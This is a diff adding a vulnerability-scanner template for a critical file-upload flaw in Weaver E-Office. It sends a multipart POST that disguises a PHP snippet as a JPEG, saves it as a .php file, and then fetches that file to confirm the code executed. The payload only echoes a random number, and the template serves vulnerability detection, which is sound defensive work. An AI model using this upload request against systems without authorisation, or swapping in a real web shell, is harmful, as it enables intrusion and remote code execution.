@@ -1,0 +1,47 @@
+id: weaver-e-office-file-upload
+info:
+  name: Weaver E-Office File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template identifies a file upload vulnerability in Weaver E-Office that allows arbitrary PHP code execution.
+  reference:
+    - https://planet.vulbox.com/detail/MTEwMTc=
+variables:
+  s1: "{{rand_int(1000000000, 9000000000)}}"
+  s2: "{{rand_text_alpha(20)}}"
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+    body: |
+      ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+      Content-Disposition: form-data; name="FileData"; filename="1.jpg"
+      Content-Type: image/jpeg
+
+      <?php echo {{s1}};?>
+      ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+      Content-Disposition: form-data; name="FormData"
+
+      {"USERNAME":"","RECORDID":"undefined","OPTION":"SAVEFILE","FILENAME":"{{s2}}.php"}
+      ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
+    matchers:
+      - type: status
+        status:
+          - 200
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/eoffice10/server/public/iWebOffice2015/Document/{{s2}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{s1}}"
+        part: body
